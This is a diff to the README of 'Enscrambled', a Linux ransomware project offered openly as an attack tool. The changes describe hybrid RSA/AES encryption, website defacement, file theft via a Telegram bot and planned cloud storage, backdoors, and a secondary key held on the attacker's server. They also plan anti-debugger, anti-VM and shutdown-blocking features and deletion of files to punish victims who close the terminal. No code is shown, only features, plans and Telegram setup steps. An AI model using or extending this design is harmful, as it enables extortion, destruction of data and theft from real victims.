@@ -1,6 +1,6 @@
 # Enscrambled
 
-This is a blended ransomware where it uses hybrid RSA/AES method. It is tested on debian/ubuntu based Linux distribution with required dependencies installed. Unlike others, it just outputs everything in terminal, just like text-based programs. It can encrypts, deface, steals and do backdoors on a target machine.
+This is a blended ransomware where it uses hybrid RSA/AES method. It is tested on debian/ubuntu based Linux distribution with required dependencies installed. Unlike others, it just outputs everything in terminal, just like text-based programs. It can encrypt files, deface server websites, steals and do backdoors on a target machine.
 
 # What is This
 
@@ -36,7 +36,9 @@ And then to produce this on netwide, you have to make this a kind of Trojan and 
 
 # Features
 
-- Hardcoded obfuscated style password and keys , blending them with garbage texts
+- For primary password, it uses hardcoded obfuscated style password and keys , blending them with garbage texts
+
+- Secondary password must provided only by attacker's server.
 
 - Uses "custom" file signature, making this as only valid software for decryption
  
@@ -68,7 +70,11 @@ And then to produce this on netwide, you have to make this a kind of Trojan and 
 
 - Make it like computer worm
 
-- Add secondary passcode key coming from attacker's server with tor service
+- RSA encryption for file_map
+
+- Use cloud-based storage service to steal and store large amount of files, without restricting us from telegram's 50MB limit.
+
+- Block most debuggers, analyzers or other forensic tools that can be use for extraction of key, though this is not possible for secondary password verification.
   
 - Block shutdown/reboot signal from executing
 
@@ -84,9 +90,15 @@ And then to produce this on netwide, you have to make this a kind of Trojan and 
 
 - Pretend to be a real specific software
 
-# Bad Idea
+# Low-priority additions
 
-- For sending large files, it needs to be archive first then splitting it into multiple files with 50MB file size. But considering the processing power limit of some of the machines and time it consumes after encryption completes, the user will have the chance to prevent this long time process by means of cutting machine's power.
+- Anti VM execution (fake cpu instructions)
+
+# Where is the server MF?
+
+For the meantime, I will not include the server binary meant for the hackers (the Attacker). I just need to polish some things to make memory analysis harder for tech-savvy.
+
+# Issues faced
 
 - Detaching the main process from terminal and then running as it's own was a good idea since it is expected that a user will stop encryption by killing Linux Terminal (by clicking "X"). But respawning itself into a new terminal will not gonna work as expected, as it was hard to implement. It just respawn into a new state of process meaning it relaunch a binary, starting the process from top, and it simultaneously runs with the first same process. So the solution is when the user close the terminal, the encryption is still going on, but it should be auto deleted as a form of punishment.
 
@@ -102,8 +114,9 @@ To obtain Chat ID or Group ID, go to your newly created bot and type something t
 
 Copy paste the Chat ID from like this one `{"id":1234567890,` and put it to `const string CHAT_ID` from `telegram.cpp`.
 
-# How to harvest password from binary
-You may use simple text editor to inspect and find the correct password. Most junk password consists of Unicode's UTF-8 character so you must set them to easily find it.
+# Limitations with Telegram
+
+For sending large files in telegram, it needs to be archive first then splitting it into multiple files with 50MB file size. But considering the processing power limit of some of the machines and time it consumes after encryption completes, the user will have the chance to prevent this long time process by means of cutting machine's power.
 
 # Warning
 
